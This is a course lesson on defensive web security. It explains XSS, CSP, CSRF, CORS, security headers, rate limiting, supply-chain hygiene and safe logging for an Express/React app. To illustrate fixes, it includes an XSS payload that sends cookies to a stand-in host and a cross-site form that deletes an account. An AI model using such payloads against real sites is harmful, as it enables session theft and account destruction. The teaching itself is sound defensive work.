# 17.6 · Web security essentials

> ⏱ 3 hours · Module 17 · Authentication & Security

## What you'll learn
- XSS: how it happens even in React, and Content Security Policy
- CSRF: how `SameSite`, Origin checks and JSON-only APIs stop it
- CORS: what it is (and what it isn't), and configuring it with credentials
- Security headers with `helmet`
- Rate limiting and brute-force protection
- Supply-chain security, secrets and safe logging

---

## XSS (cross-site scripting)

XSS means an attacker gets **their JavaScript running on your page**, in your users' browsers. That script can do anything the user can: read the page, call your API with the user's cookies, change their password, or show a fake login form.

The classic cause is putting untrusted text into HTML without escaping it:

```ts
// ❌ vanilla DOM: a player named <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
element.innerHTML = `<li>${player.name}</li>`;
```

### React protects you, mostly
JSX escapes values by default: `<li>{player.name}</li>` displays the name as **text**, tags and all. That removes the most common cause. The remaining holes in a React app are:

| Hole | Example | Fix |
|---|---|---|
| `dangerouslySetInnerHTML` | rendering a user's "bio" as HTML | avoid it. If you must render user HTML, sanitise it with **DOMPurify** first |
| URLs from users | `<a href={player.website}>` with `javascript:alert(1)` | only allow `https:` (and maybe `http:`/`mailto:`): `new URL(value).protocol === 'https:'`. React warns about `javascript:` URLs, but don't rely on that |
| Direct DOM access | `ref.current.innerHTML = …` in an effect | use `textContent`, or JSX |
| Server-rendered HTML | building HTML strings on the server | escape, or use a template engine that escapes by default |
| Third-party scripts | analytics, ads, a compromised npm package | fewer scripts; CSP; dependency hygiene (below) |

### Content Security Policy (CSP)
CSP is a response header telling the browser which sources of script, style, images and so on are allowed. Even if an attacker injects a `<script>` tag or an `onerror=` attribute, the browser refuses to run it.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

- `script-src 'self'` allows only script files from your own origin: no inline scripts, no `eval`, no attribute handlers. A Vite production build fits this, because all its JavaScript is in external files.
- `frame-ancestors 'none'` stops other sites from putting your page in an `<iframe>` (**clickjacking**).
- Start with `Content-Security-Policy-Report-Only` to see what would break before enforcing it.
- The Vite **dev** server injects inline scripts for hot reloading, so apply CSP to production builds.

## CSRF (cross-site request forgery)

The browser attaches cookies automatically, whichever site *started* the request. Without protection, a page on `evil.example` could do this:

```html
<form action="https://hearthwild.com/api/account/delete" method="POST"></form>
<script>document.forms[0].submit()</script>
```

The browser would send the user's Hearthwild session cookie along, and the account would be gone. The user never clicked anything on your site.

### Layer 1: `SameSite=Lax`
With `SameSite=Lax` (17.4), the browser **doesn't send** the cookie on cross-site `POST`s, `fetch`es or iframes. It only sends it on top-level navigations with safe methods (clicking a link). That stops the attack above.

So, rule one: **never change state on `GET`**. A `GET /api/logout` or `GET /api/delete?id=…` can be triggered by any link or `<img>` tag, and Lax cookies are sent on top-level `GET`s.

### Layer 2: check the Origin
`SameSite` is about *sites*, so it doesn't protect against a compromised or malicious **subdomain** of your own site. Browsers send an `Origin` header on cross-origin requests and on all `POST`/`PUT`/`PATCH`/`DELETE` requests, and modern browsers also send `Sec-Fetch-Site`. Reject unsafe methods from anywhere you don't expect:

```ts
const ALLOWED_ORIGINS = new Set(['https://hearthwild.com']);

function checkOrigin(req: Request, res: Response, next: NextFunction) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('origin');
  if (origin !== undefined && !ALLOWED_ORIGINS.has(origin)) {
    res.status(403).json({ error: { code: 'BAD_ORIGIN', message: 'Cross-origin request blocked' } });
    return;
  }
  next();
}
```

(Requests with **no** `Origin` header come from non-browser clients such as curl or your tests. They don't carry a victim's cookies automatically, so they aren't a CSRF risk.)

### Layer 3: JSON only
HTML forms can only send `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`. A cross-origin `fetch` with `Content-Type: application/json` triggers a CORS **preflight**, which your CORS config refuses. If your API only accepts JSON bodies (and `express.json()` only parses `application/json`), forged forms arrive with no parsed body and fail validation.

With all three layers, a separate CSRF token isn't needed for a JSON API. Traditional server-rendered apps with HTML forms use per-session **CSRF tokens** instead. You'll meet them at work (most frameworks have them built in).

## CORS (cross-origin resource sharing)

By default, the **same-origin policy** stops a page's JavaScript from *reading* responses from a different origin. **CORS is a way for a server to relax that**: "pages from `https://hearthwild.com` may read my responses."

Two common misunderstandings:

- **CORS doesn't protect your server.** It's enforced by browsers, for the user's protection. curl, scripts and attackers' servers ignore it entirely. Your auth and validation are what protect the API.
- **"CORS error" in the console means the response was blocked from your JavaScript, not that the request failed to reach the server.** Non-preflighted requests still run on the server. Check the server logs.

For "unusual" requests (`PUT`/`DELETE`, JSON bodies, custom headers), the browser first sends an `OPTIONS` **preflight** asking permission, and only sends the real request if the answer allows it.

With the one-origin layout from 17.4 you need **no CORS at all**. If the API is on another origin (`api.hearthwild.com`), configure it with the `cors` package:

```ts
import cors from 'cors';

app.use(
  cors({
    origin: ['https://hearthwild.com'],   // an explicit allowlist; never reflect any origin when credentials are on
    credentials: true,                    // allows cookies (the client must use credentials: 'include')
  }),
);
```

`origin: '*'` can't be combined with credentials, and a config that echoes back whatever `Origin` was sent lets every website on the internet make authenticated requests as your users.

## Security headers with helmet

`helmet` sets a sensible bundle of security headers in one line:

```ts
import helmet from 'helmet';
app.use(helmet());
```

Among others, it sets:

| Header | Purpose |
|---|---|
| `Content-Security-Policy` | a default CSP. Tune it for your app |
| `Strict-Transport-Security` | "only ever use HTTPS for this site" (HSTS) |
| `X-Content-Type-Options: nosniff` | stops browsers guessing that a JSON response is HTML or script |
| `Referrer-Policy: no-referrer` | doesn't leak your URLs to other sites |
| `X-Frame-Options` | old-browser clickjacking protection (alongside `frame-ancestors`) |

## Rate limiting

Without limits, an attacker can try thousands of passwords a minute against one account, or millions of leaked pairs across all accounts (17.1). Rate limiting caps how many requests a **key** can make in a **window**:

- **Login**: by username *and* by IP (e.g. 5 attempts per username per 15 minutes; 100 per IP per 15 minutes).
- **Registration**: by IP.
- **Everything**: a generous global per-IP limit protects against floods.

When the limit is hit, respond `429 Too Many Requests` with a `Retry-After` header (in seconds). You'll write a limiter in exercise 17-04 to see how it works. In production, use `express-rate-limit` with a shared store (Redis or Postgres) so the limits hold across several server instances.

### Behind a proxy
Hosting platforms put a proxy in front of your app, so `req.ip` is the **proxy's** address and every user shares one rate limit. Tell Express how many proxies to trust and it will read the real client IP from `X-Forwarded-For`:

```ts
app.set('trust proxy', 1);   // exactly one proxy in front (check your host's docs)
```

Don't set `trust proxy` to `true` blindly: anyone can send a fake `X-Forwarded-For` header, and if you trust it unconditionally, they can pick their own IP and dodge your limits.

## Supply-chain security

Your app runs thousands of other people's packages. In 2025, attackers phished maintainers of very popular npm packages and published malicious versions, and a self-spreading worm compromised hundreds more. Habits that help:

- **Commit the lockfile** and use `npm ci` in CI and deploys, so you install exactly what was reviewed.
- **Think before adding a dependency.** Is it maintained? Widely used? Could you write the 20 lines yourself?
- **Update deliberately**: Dependabot or Renovate pull requests, reviewed and tested, not `npm update` the night before a release.
- Read `npm audit` with judgement (05.2): severity × reachability × environment.
- Pin third-party GitHub Actions to a commit SHA.

## Secrets and logging

- Secrets (database URLs, OAuth client secrets) live in environment variables or your host's secret store (19.4), **never in Git**, and never in the frontend. Anything in a `VITE_` variable ends up in the JavaScript bundle, where anyone can read it.
- **Never log** passwords, session tokens, cookies, `Authorization` headers or full request bodies of auth routes. Logs end up in more places than your database does.
- Error responses never include stack traces or internal messages in production (15.5, exercise 15-04).

## Check your understanding

1. JSX escapes values. Name two ways XSS can still happen in a React app.
2. What does `script-src 'self'` block?
3. Why should state never change on a `GET` request, even with `SameSite=Lax`?
4. Does CORS protect your API from attackers? What does it do?
5. Why is reflecting the request's `Origin` with `credentials: true` dangerous?
6. Your app is behind one proxy and every user hits the login rate limit at once. What's wrong?
7. Name three supply-chain habits.

<details><summary>Answers</summary>

1. Any two of: `dangerouslySetInnerHTML` with unsanitised input, user-supplied URLs with `javascript:`, direct `innerHTML` in effects, compromised third-party scripts.
2. Scripts from any other origin, inline `<script>` blocks, inline event-handler attributes, and `eval`.
3. Lax cookies are still sent on top-level `GET` navigations, so any link, redirect or image on another site could trigger the change.
4. No. It's enforced by browsers to protect users, and non-browser clients ignore it. It lets a server allow specific other origins to read its responses.
5. It allows any website to make authenticated requests with the user's cookies and read the responses.
6. `req.ip` is the proxy's address, so everyone shares one limit. Set `app.set('trust proxy', 1)` so Express uses the real client IP.
7. Any three of: commit the lockfile and use `npm ci`; be selective about new dependencies; review automated update PRs; read `npm audit` with judgement; pin GitHub Actions to SHAs.
</details>

## Further reading
- OWASP "Cross Site Scripting Prevention", "Cross-Site Request Forgery Prevention" and "HTTP Headers" cheat sheets
- MDN: "Content Security Policy (CSP)" and "Cross-Origin Resource Sharing (CORS)"
- helmet and express-rate-limit READMEs on npm

---
[← Implementing session auth](05-implementing-session-auth.md) · [Module overview](README.md) · [Next: OAuth & social login →](07-oauth-and-social-login.md)
